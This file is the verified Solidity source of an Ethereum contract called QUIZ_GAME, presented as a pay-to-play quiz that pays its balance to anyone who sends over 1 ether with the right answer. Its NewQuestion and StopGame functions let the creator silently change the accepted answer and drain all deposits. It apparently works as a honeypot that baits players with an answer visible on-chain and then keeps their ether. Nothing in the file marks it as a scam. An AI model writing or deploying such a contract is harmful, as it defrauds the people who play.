
//Address: 0xcaa7b8aa3BC78Dda98af8FeE1390F34e756A5F55
//Contract name: QUIZ_GAME
//Balance: 0 Ether
//Verification Date: 4/11/2018
//Transacion Count: 5

// CODE STARTS HERE

pragma solidity ^0.4.19;

contract QUIZ_GAME
{
    string public question;
 
    address questionSender;
  
    bytes32 responseHash;
 
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    
    function() public payable{}
    
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        responseHash = _responseHash;
        question = _question;
    }
    
}
